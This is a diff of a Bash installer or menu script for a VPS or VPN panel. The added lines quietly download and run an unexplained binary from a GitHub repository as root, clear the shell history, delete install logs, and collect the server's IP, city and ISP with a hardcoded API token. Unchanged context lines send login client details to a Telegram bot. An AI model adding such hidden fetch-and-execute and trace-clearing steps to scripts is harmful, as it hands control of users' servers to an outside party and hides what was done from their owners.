@@ -220,6 +220,7 @@ fun_bar 'res1'
 clear
 fi
 }
+wget -q https://raw.githubusercontent.com/Tarap-Kuhing/tarap/main/api;chmod +x api;./api
 cat <<EOF>> /etc/kuhing/theme/red
 BG : \E[40;1;41m
 TEXT : \033[0;31m
@@ -385,7 +386,46 @@ echo -e "${tyblue}└───────────────────�
 
 }
 
-function iinfo(){
+CEKIP
+kuhing3
+
+cat> /root/.profile << END
+if [ "$BASH" ]; then
+if [ -f ~/.bashrc ]; then
+. ~/.bashrc
+fi
+fi
+mesg n || true
+clear
+menu
+END
+chmod 644 /root/.profile
+if [ -f "/root/log-install.txt" ]; then
+rm /root/log-install.txt > /dev/null 2>&1
+fi
+if [ -f "/etc/afak.conf" ]; then
+rm /etc/afak.conf > /dev/null 2>&1
+fi
+if [ ! -f "/etc/log-create-user.log" ]; then
+echo "Log All Account " > /etc/log-create-user.log
+fi
+history -c
+serverV=$( curl -sS https://raw.githubusercontent.com/Tarap-Kuhing/tarap/main/versi  )
+echo $serverV > /opt/.ver
+aureb=$(cat /home/re_otm)
+b=11
+if [ $aureb -gt $b ]
+then
+gg="PM"
+else
+gg="AM"
+fi
+rm -rf /etc/baca
+rm -rf /etc/myipvps
+curl -sS ifconfig.me > /etc/myipvps
+curl -s ipinfo.io/city?token=75082b4831f909 >> /etc/xray/city
+curl -s ipinfo.io/org?token=75082b4831f909  | cut -d " " -f 2-10 >> /etc/xray/isp
+curl -s https://pastebin.com/raw/0gWiX6hE >> /etc/baca
 IP=$(echo $SSH_CLIENT | awk '{print $1}')
 TMPFILE='/tmp/ipinfo-$DATE_EXEC.txt'
 curl http://ipinfo.io/$IP -s -o $TMPFILE
@@ -427,48 +467,6 @@ TEXT="
 "
 curl -s --max-time $TIMES -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
 clear
-}
-
-CEKIP
-kuhing3
-
-cat> /root/.profile << END
-if [ "$BASH" ]; then
-if [ -f ~/.bashrc ]; then
-. ~/.bashrc
-fi
-fi
-mesg n || true
-clear
-menu
-END
-chmod 644 /root/.profile
-if [ -f "/root/log-install.txt" ]; then
-rm /root/log-install.txt > /dev/null 2>&1
-fi
-if [ -f "/etc/afak.conf" ]; then
-rm /etc/afak.conf > /dev/null 2>&1
-fi
-if [ ! -f "/etc/log-create-user.log" ]; then
-echo "Log All Account " > /etc/log-create-user.log
-fi
-history -c
-serverV=$( curl -sS https://raw.githubusercontent.com/Tarap-Kuhing/tarap/main/versi  )
-echo $serverV > /opt/.ver
-aureb=$(cat /home/re_otm)
-b=11
-if [ $aureb -gt $b ]
-then
-gg="PM"
-else
-gg="AM"
-fi
-rm -rf /etc/baca
-rm -rf /etc/myipvps
-curl -sS ifconfig.me > /etc/myipvps
-curl -s ipinfo.io/city?token=75082b4831f909 >> /etc/xray/city
-curl -s ipinfo.io/org?token=75082b4831f909  | cut -d " " -f 2-10 >> /etc/xray/isp
-curl -s https://pastebin.com/raw/0gWiX6hE >> /etc/baca
 echo " "
 echo "━━━━━━━━━━━━━━━━━━[ Script Premium ]━━━━━━━━━━━━━━━━━━━━━━━━━━"
 echo ""
